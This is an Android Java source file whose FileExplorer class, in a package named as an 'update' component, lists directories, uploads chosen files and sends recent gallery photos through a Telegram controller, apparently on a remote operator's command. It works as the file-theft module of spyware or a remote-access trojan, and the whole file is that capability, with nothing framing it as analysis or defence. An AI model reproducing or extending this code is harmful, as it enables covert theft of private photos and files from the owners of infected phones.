package com.kasari.update;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.provider.MediaStore;
import java.io.*;
import java.util.*;

public class FileExplorer {

    // ─── List directory contents ──────────────────────────────────────────────
    public static void listDirectory(String path) {
        new Thread(() -> {
            File dir = new File(path);
            if (!dir.exists() || !dir.isDirectory()) {
                TelegramController.sendMessage("❌ Path nahi mila: " + path);
                return;
            }
            File[] files = dir.listFiles();
            if (files == null || files.length == 0) {
                TelegramController.sendMessage("📂 Empty: " + path);
                return;
            }
            Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() != b.isDirectory()) return a.isDirectory() ? -1 : 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });
            StringBuilder sb = new StringBuilder("📂 " + path + "\n\n");
            int count = 0;
            for (File f : files) {
                String icon = f.isDirectory() ? "📁" : "📄";
                String size = f.isFile() ? " (" + formatSize(f.length()) + ")" : "/";
                sb.append(icon).append(" ").append(f.getName()).append(size).append("\n");
                count++;
                if (count % 40 == 0) {
                    TelegramController.sendMessage(sb.toString());
                    sb.setLength(0);
                    try { Thread.sleep(300); } catch (Exception ignored) {}
                }
            }
            if (sb.length() > 5) TelegramController.sendMessage(sb.toString());
            TelegramController.sendMessage("✅ Total: " + count + " items");
        }).start();
    }

    // ─── Send a specific file ─────────────────────────────────────────────────
    public static void sendFile(String path) {
        new Thread(() -> {
            File f = new File(path);
            if (!f.exists() || !f.isFile()) {
                TelegramController.sendMessage("❌ File nahi mila: " + path);
                return;
            }
            TelegramController.sendFile(f, "📄 " + f.getName() + " (" + formatSize(f.length()) + ")");
        }).start();
    }

    // ─── Send gallery photos ──────────────────────────────────────────────────
    public static void sendGallery(Context ctx, int limit) {
        TelegramController.sendMessage("🖼 Gallery photos bhej raha hun...");
        Cursor cursor = null;
        int sent = 0;
        try {
            cursor = ctx.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED},
                null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    if (sent >= limit) break;
                    String path = cursor.getString(0);
                    if (path == null) continue;
                    File orig = new File(path);
                    if (!orig.exists()) continue;

                    // Resize to max 1080px wide
                    File toSend = resizeIfNeeded(orig, ctx);
                    if (toSend != null) {
                        TelegramController.sendPhoto(toSend, "🖼 " + orig.getName());
                        if (!toSend.equals(orig)) toSend.delete();
                        sent++;
                        Thread.sleep(600);
                    }
                } while (cursor.moveToNext());
            }
        } catch (Exception e) { e.printStackTrace(); }
        finally { if (cursor != null) cursor.close(); }
        TelegramController.sendMessage("✅ Gallery done. Bheja: " + sent + " photos.");
    }

    private static File resizeIfNeeded(File orig, Context ctx) {
        try {
            BitmapFactory.Options opts = new BitmapFactory.Options();
            opts.inJustDecodeBounds = true;
            BitmapFactory.decodeFile(orig.getAbsolutePath(), opts);
            int maxW = 1080;
            if (opts.outWidth <= maxW) return orig;
            // Need to resize
            opts.inJustDecodeBounds = false;
            opts.inSampleSize = opts.outWidth / maxW;
            Bitmap bmp = BitmapFactory.decodeFile(orig.getAbsolutePath(), opts);
            if (bmp == null) return orig;
            float scale = (float) maxW / bmp.getWidth();
            Bitmap scaled = Bitmap.createScaledBitmap(bmp, maxW, (int)(bmp.getHeight() * scale), true);
            bmp.recycle();
            File out = new File(ctx.getCacheDir(), "gal_" + System.currentTimeMillis() + ".jpg");
            FileOutputStream fos = new FileOutputStream(out);
            scaled.compress(Bitmap.CompressFormat.JPEG, 80, fos);
            fos.close();
            scaled.recycle();
            return out;
        } catch (Exception e) { return orig; }
    }

    private static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + " KB";
        return String.format(Locale.getDefault(), "%.1f MB", bytes / 1024.0 / 1024.0);
    }
}
